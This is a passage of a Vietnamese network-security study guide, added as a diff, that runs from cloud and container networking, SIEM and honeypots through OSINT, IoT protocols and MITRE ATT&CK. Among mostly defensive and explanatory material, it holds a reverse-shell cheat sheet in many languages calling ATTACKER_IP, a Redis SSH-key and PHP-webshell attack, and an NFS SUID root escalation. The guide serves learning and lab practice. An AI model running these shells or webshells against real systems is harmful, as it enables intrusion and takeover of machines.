+  Network ACL: Stateless firewall per subnet (allow + deny rules)
+  VPC Peering: Kết nối 2 VPC (same/cross account)
+  Transit Gateway: Hub kết nối nhiều VPC + on-premises
+  VPC Endpoint: Truy cập AWS services mà không qua Internet
+  PrivateLink: Expose service cho VPC khác qua private connection
+
+Security Group vs NACL:
+┌──────────────┬──────────────────┬──────────────────┐
+│              │ Security Group   │ NACL             │
+├──────────────┼──────────────────┼──────────────────┤
+│ Level        │ Instance (ENI)   │ Subnet           │
+│ Stateful     │ Yes              │ No               │
+│ Rules        │ Allow only       │ Allow + Deny     │
+│ Evaluation   │ All rules        │ In order (number)│
+│ Default      │ Deny all inbound │ Allow all        │
+└──────────────┴──────────────────┴──────────────────┘
+
+# Common misconfigs:
+# Security Group: 0.0.0.0/0 cho port 22/3389 (SSH/RDP open to world)
+# S3 bucket policy public
+# IMDSv1 → SSRF → steal IAM credentials
+# VPC Flow Logs not enabled
+```
+
+## 17.2 Azure Networking
+
+```
+Virtual Network (VNet): Tương đương AWS VPC
+Network Security Group (NSG): Tương đương Security Group + NACL
+Azure Firewall: Managed firewall service
+Application Gateway: L7 load balancer + WAF
+VNet Peering: Kết nối VNet
+ExpressRoute: Dedicated connection (tương đương AWS Direct Connect)
+Private Endpoint: Truy cập Azure service qua private IP
+```
+
+## 17.3 Container Networking
+
+```
+=== Docker Networking ===
+Modes:
+  bridge (default): Container trên cùng bridge network nói chuyện được
+  host: Container dùng host network stack (không isolation)
+  none: Không network
+  overlay: Multi-host networking (Docker Swarm)
+  macvlan: Container có MAC address riêng trên physical network
+
+# Docker network commands
+docker network ls
+docker network inspect bridge
+docker network create --driver bridge my-network
+docker run --network my-network nginx
+
+# Security:
+# Container mặc định có thể nói chuyện với nhau trên cùng bridge
+# → Dùng network segmentation
+# --icc=false: Disable inter-container communication
+# Docker daemon listens on unix socket by default
+# Exposing TCP socket (2375/2376) → RCE nếu không auth!
+
+=== Kubernetes Networking ===
+Pod-to-Pod: Tất cả pod nói chuyện được (flat network)
+Service: Load balance traffic đến pods
+Ingress: L7 routing (HTTP host/path → service)
+NetworkPolicy: Firewall rules giữa pods
+
+CNI Plugins: Calico, Cilium, Flannel, Weave
+
+# NetworkPolicy ví dụ: Chỉ cho phép frontend → backend
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: backend-policy
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  ingress:
+  - from:
+    - podSelector:
+        matchLabels:
+          app: frontend
+    ports:
+    - protocol: TCP
+      port: 8080
+
+# Kubernetes security:
+# API Server exposed → kubectl access
+# etcd unencrypted → secrets leak
+# ServiceAccount token mount → lateral movement
+# Kubelet API (10250) unauthenticated → RCE
+```
+
+## 17.4 Zero Trust Network Architecture (ZTNA)
+
+```
+Nguyên tắc: "Never trust, always verify"
+Không tin bất kỳ traffic nào, kể cả từ internal network.
+
+Core Principles:
+1. Verify explicitly: Authenticate mọi request
+2. Least privilege: Tối thiểu quyền cần thiết
+3. Assume breach: Thiết kế như đã bị compromise
+
+Components:
+  - Identity Provider (IdP): Azure AD, Okta
+  - Policy Engine: Quyết định allow/deny dựa trên context
+  - Policy Enforcement Point: Enforce quyết định
+  - Microsegmentation: Firewall từng workload
+  - Continuous monitoring: Liên tục evaluate trust
+
+vs Traditional (Perimeter-based):
+  Traditional: Trust internal, distrust external (castle-and-moat)
+  Zero Trust: Trust nothing, verify everything
+
+Implementation:
+  - BeyondCorp (Google): Pioneer Zero Trust
+  - Azure AD Conditional Access
+  - Zscaler Private Access
+  - Cloudflare Access
+```
+
+---
+
+# PHẦN 18: DEFENSE & MONITORING
+
+## 18.1 SIEM (Security Information and Event Management)
+
+```
+SIEM = Thu thập log + Correlate events + Alert
+
+Popular SIEMs:
+  - Splunk (enterprise, expensive)
+  - ELK Stack / Elastic SIEM (open source)
+  - Wazuh (open source, HIDS + SIEM)
+  - Microsoft Sentinel (cloud, Azure)
+  - QRadar (IBM)
+
+=== ELK Stack ===
+Elasticsearch: Search engine, lưu trữ log
+Logstash: Thu thập, parse, transform log
+Kibana: Visualization, dashboard
+Beats: Lightweight shipper (Filebeat, Packetbeat, Winlogbeat)
+
+Architecture:
+  Sources → Beats/Logstash → Elasticsearch → Kibana
+  
+# Filebeat config cho syslog
+filebeat.inputs:
+- type: syslog
+  protocol.tcp:
+    host: "0.0.0.0:514"
+output.elasticsearch:
+  hosts: ["localhost:9200"]
+
+=== Splunk ===
+# Search query language (SPL)
+index=main sourcetype=syslog "failed password"
+index=main sourcetype=syslog src_ip=10.10.10.100 | stats count by dest_port
+index=main sourcetype=firewall action=blocked | timechart count by src_ip
+
+# Detect brute force
+index=main sourcetype=syslog "Failed password"
+| stats count by src_ip
+| where count > 10
+
+# Detect port scan
+index=main sourcetype=firewall
+| stats dc(dest_port) as unique_ports by src_ip
+| where unique_ports > 50
+
+=== Wazuh ===
+# Agent-based: Deploy agent trên mỗi host
+# Chức năng: Log analysis, file integrity monitoring,
+#            rootkit detection, compliance checking
+# Rules: XML-based, tương thích OSSEC
+# API: RESTful, integrate với ELK
+```
+
+## 18.2 NetFlow / sFlow / IPFIX
+
+```
+NetFlow (Cisco): Export flow metadata từ router/switch
+sFlow: Sampling-based flow monitoring
+IPFIX: Standardized NetFlow v10
+
+Flow record bao gồm:
+  Source IP, Dest IP, Source Port, Dest Port,
+  Protocol, Bytes, Packets, Timestamps, Interfaces
+
+# Tại sao quan trọng cho security?
+# Phát hiện: Data exfiltration (traffic lớn ra ngoài bất thường)
+# Phát hiện: Lateral movement (internal traffic patterns thay đổi)
+# Phát hiện: C2 beaconing (periodic connections đến external IP)
+# Phát hiện: DDoS (traffic spike)
+
+# Tools:
+# nfdump/nfsen: NetFlow collector/analyzer
+# ntopng: Real-time network traffic analysis
+# SiLK: Network flow analysis
+
+# Detect C2 beaconing pattern:
+# Tìm connection với interval đều đặn (ví dụ mỗi 60 giây)
+# → Periodic pattern + external destination + small data = suspicious
+```
+
+## 18.3 Honeypots & Honeynets
+
+```
+Honeypot: Hệ thống giả mạo, thu hút attacker để:
+  1. Detect intrusion (early warning)
+  2. Study attacker TTPs (Tactics, Techniques, Procedures)
+  3. Deflect from real assets
+
+Types:
+  Low-interaction: Giả lập services (ít risk, dễ deploy)
+  High-interaction: Real OS/services (nhiều info, nhiều risk)
+
+# === Cowrie (SSH/Telnet Honeypot) ===
+# Giả lập SSH server, log mọi thứ attacker làm
+docker run -p 2222:2222 cowrie/cowrie
+
+# Log: Commands, uploads, sessions
+# Attacker nghĩ đang SSH vào real server
+
+# === T-Pot (All-in-one) ===
+# Bao gồm: Cowrie, Dionaea, Honeytrap, Conpot, v.v.
+# Tích hợp ELK cho visualization
+# https://github.com/telekom-security/tpotce
+
+# === Dionaea (Malware honeypot) ===
+# Giả lập SMB, HTTP, FTP, MSSQL
+# Bắt malware samples
+
+# === HoneyD ===
+# Giả lập toàn bộ network topology
+# Tạo hàng trăm "host" ảo với services
+
+# === Canary Tokens ===
+# Không phải honeypot truyền thống
+# Tạo file/URL/DNS token → đặt ở nơi chỉ attacker mới access
+# Khi access → alert
+# https://canarytokens.org
+# Ví dụ: Đặt file "passwords.xlsx" (canary) trên share
+# → Ai mở = compromise detected
+```
+
+## 18.4 Network Hardening (CIS Benchmarks)
+
+```
+=== Switch Hardening ===
+1. Disable unused ports
+2. Port Security (limit MAC per port)
+3. DHCP Snooping
+4. Dynamic ARP Inspection (DAI)
+5. 802.1X on access ports
+6. BPDU Guard on access ports
+7. Root Guard on distribution ports
+8. VLAN access lists (VACL)
+9. Private VLANs
+10. Disable CDP/LLDP trên edge ports
+11. Disable DTP (switchport nonegotiate)
+12. Native VLAN ≠ VLAN 1
+13. SSH instead of Telnet for management
+14. SNMPv3 instead of v1/v2c
+15. AAA (RADIUS/TACACS+) for admin login
+
+=== Router Hardening ===
+1. Disable unnecessary services (finger, http server, CDP)
+2. SSH instead of Telnet
+3. ACL on VTY lines (restrict management access)
+4. Routing protocol authentication (OSPF MD5, BGP MD5)
+5. uRPF (Unicast Reverse Path Forwarding) - anti-spoofing
+6. Control plane policing (CoPP)
+7. Disable source routing
+8. SNMP v3 with authentication + encryption
+9. NTP authentication
+10. Syslog to external server
+```
+
+---
+
+# PHẦN 19: OSINT & RECONNAISSANCE TOOLS
+
+## 19.1 Passive Reconnaissance
+
+### Shodan - Search Engine for IoT/Devices
+
+```bash
+# Web: https://shodan.io
+# CLI:
+pip install shodan
+shodan init YOUR_API_KEY
+
+# Tìm device theo service
+shodan search "apache" --limit 10
+shodan search "port:22 country:VN"
+shodan search "webcamxp"
+shodan search "default password"
+
+# Tìm target cụ thể
+shodan host 8.8.8.8
+shodan domain example.com
+
+# Shodan Dorks (web):
+# org:"Target Company"
+# net:203.0.113.0/24
+# port:3389 country:VN
+# "Server: Apache" "302" city:"Ho Chi Minh"
+# vuln:CVE-2021-44228     (tìm Log4Shell!)
+# product:nginx version:1.6
+# ssl.cert.subject.cn:target.com
+# http.title:"Dashboard" port:8080
+
+# Shodan alternatives:
+# Censys: https://censys.io (certificate-focused)
+# ZoomEye: https://zoomeye.org (Chinese Shodan)
+# FOFA: https://fofa.info
+```
+
+### Amass - Subdomain Enumeration
+
+```bash
+# Passive enumeration
+amass enum -passive -d target.com
+
+# Active enumeration (DNS brute force + resolution)
+amass enum -active -d target.com -brute
+
+# Với config (nhiều data sources)
+amass enum -d target.com -config amass_config.yaml
+
+# Output
+amass enum -d target.com -o subdomains.txt
+
+# Visualization
+amass viz -d target.com -o graph.html
+```
+
+### Subfinder + httpx combo
+
+```bash
+# Tìm subdomain
+subfinder -d target.com -o subs.txt
+
+# Check subdomain nào alive
+cat subs.txt | httpx -status-code -title -tech-detect -o alive.txt
+
+# Full recon pipeline
+subfinder -d target.com -silent | httpx -silent | nuclei -t cves/
+```
+
+### Google Dorks
+
+```
+site:target.com                         # Chỉ kết quả từ target.com
+site:target.com filetype:pdf            # Tìm PDF
+site:target.com inurl:admin             # Tìm admin panel
+site:target.com intitle:"index of"      # Directory listing
+site:target.com ext:sql | ext:db        # Database files
+site:target.com intext:"password"       # Password trong page
+"target.com" ext:log                    # Log files
+"target.com" ext:conf | ext:cfg        # Config files
+site:pastebin.com "target.com"          # Leaks trên Pastebin
+site:github.com "target.com" password   # Credentials trên GitHub
+inurl:"wp-admin" site:target.com        # WordPress admin
+```
+
+### Nessus / OpenVAS - Vulnerability Scanners
+
+```bash
+# === OpenVAS (Free) ===
+# Cài đặt
+sudo apt install gvm
+sudo gvm-setup
+sudo gvm-start
+# Truy cập: https://localhost:9392
+
+# OpenVAS CLI
+omp -u admin -w password --xml='<create_target>...</create_target>'
+
+# === Nessus (Commercial, free for personal use) ===
+# Download từ: https://www.tenable.com/products/nessus
+# Truy cập: https://localhost:8834
+# Scan types: Basic Network Scan, Advanced Scan, Web Application
+# Policies: Customize checks
+# Compliance: CIS benchmarks, PCI DSS
+
+# So sánh:
+# Nessus: Nhiều plugin hơn, UI tốt hơn, commercial support
+# OpenVAS: Free, community-driven, đủ dùng cho lab
+```
+
+## 19.2 Web Enumeration Tools
+
+```bash
+# === Gobuster (Directory/file brute force) ===
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
+gobuster dns -d target.com -w subdomains.txt
+gobuster vhost -u http://target.com -w wordlist.txt
+
+# === ffuf (Fuzz Faster U Fool) ===
+# Directory fuzzing
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
+
+# Parameter fuzzing
+ffuf -w params.txt -u "http://target.com/page?FUZZ=value"
+
+# Virtual host fuzzing
+ffuf -w vhosts.txt -u http://target.com -H "Host: FUZZ.target.com" \
+  -fs 4242    # Filter by response size
+
+# POST data fuzzing
+ffuf -w passwords.txt -X POST -d "user=admin&pass=FUZZ" \
+  -u http://target.com/login -fc 401
+
+# === Nikto (Web vulnerability scanner) ===
+nikto -h http://target.com
+nikto -h http://target.com -ssl         # HTTPS
+nikto -h http://target.com -Tuning x    # All tests
+
+# === WhatWeb (Technology fingerprinting) ===
+whatweb http://target.com
+whatweb -a 3 http://target.com          # Aggressive
+```
+
+---
+
+# PHẦN 20: REVERSE SHELLS - TOÀN TẬP
+
+## 20.1 Reverse Shell là gì?
+
+```
+Normal Shell:
+  Attacker ──connect──→ Victim:port (SSH, Telnet)
+  → Bị firewall block vì inbound connection
+
+Reverse Shell:
+  Victim ──connect──→ Attacker:port
+  → Bypass firewall vì outbound connection thường cho phép!
+
+Bind Shell:
+  Victim mở port, chờ attacker connect
+  → Bị firewall block vì listen port
+```
+
+## 20.2 Reverse Shell Cheat Sheet
+
+```bash
+# === Attacker: Listener ===
+nc -lvnp 4444
+# Hoặc dùng rlwrap cho history/arrow keys
+rlwrap nc -lvnp 4444
+
+# === Bash ===
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+
+# === Python ===
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Python 3
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# === PHP ===
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# === Perl ===
+perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# === Ruby ===
+ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# === PowerShell (Windows) ===
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# === Netcat (nếu có -e)===
+nc ATTACKER_IP 4444 -e /bin/bash
+
+# === Netcat without -e ===
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+# === OpenSSL (Encrypted reverse shell) ===
+# Attacker:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+# Victim:
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s
+
+# === Socat (Full TTY reverse shell) ===
+# Attacker:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
+```
+
+## 20.3 Upgrade Shell to Interactive TTY
+
+```bash
+# Bước 1: Spawn PTY
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# hoặc
+script -qc /bin/bash /dev/null
+
+# Bước 2: Background shell
+Ctrl+Z
+
+# Bước 3: Set terminal
+stty raw -echo; fg
+
+# Bước 4: Set environment
+export TERM=xterm
+export SHELL=bash
+stty rows 40 columns 160
+```
+
+---
+
+# PHẦN 21: IoT & PROTOCOL SECURITY
+
+## 21.1 MQTT (Message Queuing Telemetry Transport)
+
+```
+Port: 1883 (plain), 8883 (TLS)
+Dùng cho: IoT devices, smart home, sensors
+Model: Publish/Subscribe qua Broker
+
+Components:
+  Publisher → Broker (Mosquitto, HiveMQ) → Subscriber
+  Topic: hierarchical (home/bedroom/temperature)
+
+# Recon MQTT
+nmap -sV -p 1883 target
+mosquitto_sub -h target -t '#' -v    # Subscribe ALL topics!
+# '#' = wildcard tất cả topics → xem tất cả messages
+
+# Nếu broker KHÔNG có authentication:
+# → Đọc tất cả sensor data
+# → Publish command giả (mở cửa, tắt đèn, v.v.)
+mosquitto_pub -h target -t 'home/door/lock' -m 'UNLOCK'
+
+# Tools:
+# mqtt-pwn: MQTT pentest framework
+# MQTT Explorer: GUI client
+```
+
+## 21.2 CoAP (Constrained Application Protocol)
+
+```
+Port: UDP 5683
+Dùng cho: Resource-constrained IoT devices
+Giống HTTP nhưng nhẹ hơn (UDP instead of TCP)
+Methods: GET, POST, PUT, DELETE (giống HTTP)
+
+# Scan CoAP
+nmap -sU -p 5683 target
+coap-client -m get coap://target/.well-known/core    # Discover resources
+```
+
+## 21.3 HTTP/2 và HTTP/3 (QUIC)
+
+```
+=== HTTP/2 ===
+- Binary protocol (thay vì text của HTTP/1.1)
+- Multiplexing: Nhiều request trên 1 TCP connection
+- Header compression (HPACK)
+- Server push
+- Stream prioritization
+
+Security implications:
+- HTTP/2 request smuggling (khác HTTP/1.1)
+- Desync attacks giữa frontend (HTTP/2) và backend (HTTP/1.1)
+- HPACK bomb (decompression bomb qua header compression)
+
+=== HTTP/3 (QUIC) ===
+- Dựa trên UDP (thay TCP)
+- Built-in TLS 1.3
+- 0-RTT connection establishment
+- Giảm head-of-line blocking
+- Connection migration (đổi IP không mất session)
+
+Security:
+- UDP-based → khác biệt firewall rules
+- 0-RTT replay attacks
+- QUIC traffic khó inspect hơn cho IDS/IPS
+```
+
+## 21.4 WebSocket Security
+
+```
+WebSocket: Full-duplex communication qua 1 TCP connection
+Upgrade: HTTP → WebSocket
+
+# Handshake
+GET /chat HTTP/1.1
+Upgrade: websocket
+Connection: Upgrade
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+
+# Response
+HTTP/1.1 101 Switching Protocols
+Upgrade: websocket
+Connection: Upgrade
+
+# Security issues:
+# Cross-Site WebSocket Hijacking (CSWSH)
+# No same-origin enforcement (phải check Origin header manually)
+# Injection trong messages
+# Missing authentication after upgrade
+
+# Testing với wscat
+npm install -g wscat
+wscat -c ws://target.com/ws
+
+# Burp Suite: Proxy → WebSocket History
+```
+
+## 21.5 gRPC Security
+
+```
+gRPC: High-performance RPC framework (Google)
+Protocol: HTTP/2 + Protocol Buffers
+Port: Thường 50051
+
+# gRPC reflection (tương tự WSDL discovery)
+grpcurl -plaintext target:50051 list        # List services
+grpcurl -plaintext target:50051 describe    # Describe methods
+grpcurl -plaintext -d '{"name":"test"}' target:50051 package.Service/Method
+
+# Security:
+# Nếu reflection enabled → enum toàn bộ API
+# Plaintext gRPC (không TLS) → sniffing
+# Missing authentication/authorization
+# Proto definition leak → understand internal API
+```
+
+---
+
+# PHẦN 22: NTP, NFS & OTHER SERVICES
+
+## 22.1 NTP (Network Time Protocol) - Port 123
+
+```bash
+# NTP quan trọng vì:
+# Kerberos dựa vào time sync (max 5 min skew)
+# Log correlation cần time sync
+# Certificate validation dựa vào time
+
+# NTP Enumeration
+ntpq -p target                    # List NTP peers
+nmap --script ntp-info -p 123 target
+nmap --script ntp-monlist -p 123 target   # monlist (amplification vector)
+
+# NTP Attacks:
+# 1. NTP Amplification DDoS (monlist)
+# 2. Time manipulation → break Kerberos, bypass cert expiry
+# 3. NTP mode 6 (control) queries → info disclosure
+
+# Phòng chống:
+# Disable monlist: restrict noquery
+# Use NTP authentication
+# Pool: pool.ntp.org instead of single server
+```
+
+## 22.2 NFS (Network File System) - Port 2049
+
+```bash
+# NFS Enumeration
+showmount -e 192.168.1.100              # List exported shares
+nmap --script nfs-showmount 192.168.1.100
+
+# Mount NFS share
+mkdir /mnt/nfs
+mount -t nfs 192.168.1.100:/share /mnt/nfs
+mount -t nfs -o vers=3 192.168.1.100:/share /mnt/nfs
+
+# Common misconfig: no_root_squash
+# → root trên client = root trên NFS server
+# Exploit: Mount share, tạo SUID binary, execute trên server
+
+# Tạo SUID bash (nếu no_root_squash):
+cp /bin/bash /mnt/nfs/rootbash
+chmod +s /mnt/nfs/rootbash
+# Trên server: ./rootbash -p → root shell!
+```
+
+## 22.3 Redis - Port 6379
+
+```bash
+# Redis mặc định KHÔNG CÓ authentication!
+redis-cli -h 192.168.1.100
+
+# Enum
+INFO
+CONFIG GET *
+KEYS *
+GET key_name
+
+# Write SSH key (RCE nếu Redis chạy root)
+redis-cli -h target
+> CONFIG SET dir /root/.ssh/
+> CONFIG SET dbfilename authorized_keys
+> SET payload "\n\nssh-rsa AAAA... attacker@kali\n\n"
+> SAVE
+
+# Write webshell
+> CONFIG SET dir /var/www/html/
+> CONFIG SET dbfilename shell.php
+> SET payload "<?php system($_GET['cmd']); ?>"
+> SAVE
+# Truy cập: http://target/shell.php?cmd=id
+```
+
+## 22.4 MongoDB - Port 27017
+
+```bash
+# MongoDB mặc định KHÔNG CÓ authentication!
+mongo --host 192.168.1.100
+
+# Enum
+> show dbs
+> use admin
+> show collections
+> db.users.find()
+> db.users.find().pretty()
+
+# Dump toàn bộ
+mongodump --host 192.168.1.100 --out /tmp/dump
+
+# Nmap script
+nmap --script mongodb-info,mongodb-databases -p 27017 target
+```
+
+---
+
+# PHẦN 23: eBPF & MODERN NETWORK SECURITY
+
+## 23.1 eBPF (extended Berkeley Packet Filter)
+
+```
+eBPF là gì?
+Chạy sandboxed programs trong Linux kernel KHÔNG cần modify kernel.
+Dùng cho: Network monitoring, security enforcement, observability.
+
+Use cases Security:
+  - Packet filtering hiệu suất cao (thay iptables)
+  - System call monitoring (detect malicious behavior)
+  - Container network policy (Cilium)
+  - Runtime security (Falco, Tetragon)
+
+# === Cilium (Kubernetes CNI + Security) ===
+# Network policy enforcement bằng eBPF
+# Thay vì iptables rules → eBPF programs
+# L3/L4 + L7 policy (HTTP, gRPC, Kafka)
+# Transparent encryption (WireGuard)
+
+# === Falco (Runtime Security) ===
+# Detect suspicious behavior dựa trên syscall monitoring
+# Rules ví dụ:
+# - Phát hiện shell spawn trong container
+# - Phát hiện sensitive file read (/etc/shadow)
+# - Phát hiện outbound connection bất thường
+
+# === Tetragon (Cilium) ===
+# eBPF-based security observability
+# Enforce policies tại kernel level
+# Detect + prevent file/network/process events
+
+# === bpftrace (Tracing tool) ===
+# Trace network events
+bpftrace -e 'tracepoint:net:netif_rx { printf("%s\n", comm); }'
+bpftrace -e 'kprobe:tcp_connect { printf("TCP connect: %s\n", comm); }'
+```
+
+---
+
+# PHẦN 24: NETWORK SECURITY FRAMEWORKS & COMPLIANCE
+
+## 24.1 NIST Cybersecurity Framework
+
+```
+5 Core Functions:
+  1. Identify   → Asset management, risk assessment
+  2. Protect    → Access control, awareness, data security
+  3. Detect     → Anomalies, continuous monitoring, detection processes
+  4. Respond    → Response planning, communications, analysis
+  5. Recover    → Recovery planning, improvements
+
+Network Security Controls (NIST 800-53):
+  AC (Access Control)
+  AU (Audit and Accountability)
+  CA (Security Assessment)
+  SC (System and Communications Protection)
+  SI (System and Information Integrity)
+```
+
+## 24.2 MITRE ATT&CK - Network Techniques
+
+```
+Reconnaissance:
+  T1595 - Active Scanning
+  T1590 - Gather Victim Network Information
+  T1596 - Search Open Technical Databases
+
+Initial Access:
+  T1133 - External Remote Services
+  T1190 - Exploit Public-Facing Application
+
+Lateral Movement:
+  T1021 - Remote Services (SSH, RDP, SMB, WinRM)
+  T1080 - Taint Shared Content
+  T1563 - Remote Service Session Hijacking
+
+Command and Control:
+  T1071 - Application Layer Protocol (HTTP, DNS, SMTP)
+  T1572 - Protocol Tunneling
+  T1573 - Encrypted Channel
+  T1090 - Proxy
+  T1095 - Non-Application Layer Protocol (ICMP)
+
+Exfiltration:
+  T1048 - Exfiltration Over Alternative Protocol
+  T1041 - Exfiltration Over C2 Channel
+  T1567 - Exfiltration Over Web Service
+
+# Dùng ATT&CK để:
+# 1. Map coverage: Kiểm tra detection rules cover technique nào
+# 2. Gap analysis: Technique nào chưa có detection
+# 3. Threat modeling: Threat actor dùng technique nào
+# 4. Purple team: Red team tấn công theo ATT&CK, blue team detect
+```
+
+---
+
+# TỔNG KẾT CUỐI CÙNG
+
+## Network Learning Path (Thứ tự học)
+
+```
+Level 1 - Foundations (Tuần 1-4):
+  □ OSI Model + TCP/IP Model
+  □ IP addressing + Subnetting
+  □ TCP/UDP + Handshakes
+  □ DNS, DHCP, ARP
+  □ Basic tools: ping, traceroute, netstat, nmap
+  □ Lab: Dựng VirtualBox + Kali + Metasploitable
+
+Level 2 - Intermediate (Tuần 5-8):
+  □ Wireshark + tcpdump deep dive
+  □ HTTP/HTTPS + TLS
+  □ Routing & Switching (VLAN, STP, OSPF)
+  □ Firewall (iptables/nftables)
+  □ Nmap advanced (NSE scripts)
+  □ Lab: TryHackMe Network rooms
+
+Level 3 - Offensive (Tuần 9-14):
+  □ MITM attacks (ARP, DNS, SSL strip)
+  □ Password attacks (Hydra, CrackMapExec)
+  □ Responder + NTLM relay
+  □ Network scanning methodology
+  □ Burp Suite / Charles Proxy
+  □ Lab: HackTheBox Easy machines
+
+Level 4 - Red Team (Tuần 15-20):
+  □ Pivoting (SSH, Chisel, Ligolo-ng)
+  □ Tunneling (DNS, ICMP, HTTP)
+  □ Lateral Movement (PtH, PtT, WinRM)
+  □ Kerberos attacks
+  □ C2 Frameworks (Sliver)
+  □ Lab: HackTheBox Pro Labs (Dante, Offshore)
+
+Level 5 - Expert (Tuần 21+):
+  □ Cloud networking (AWS/Azure)
+  □ Container/K8s networking
+  □ Zero Trust architecture
+  □ BGP/OSPF attacks
+  □ Advanced evasion
+  □ DDoS mitigation
+  □ SIEM + threat detection
+  □ eBPF security
+  □ Cert: OSCP → CRTO → OSEP
+```
+
 > **Lời khuyên cuối**: Networking là nền tảng của mọi thứ trong security. Đừng vội nhảy vào tools mà chưa hiểu fundamentals. Khi bạn hiểu packet đi từ đâu đến đâu, qua những gì, bạn sẽ tự biết cách exploit và defend. Hãy dựng lab và thực hành. Đọc xong phần nào → làm lab phần đó. Không có shortcut.
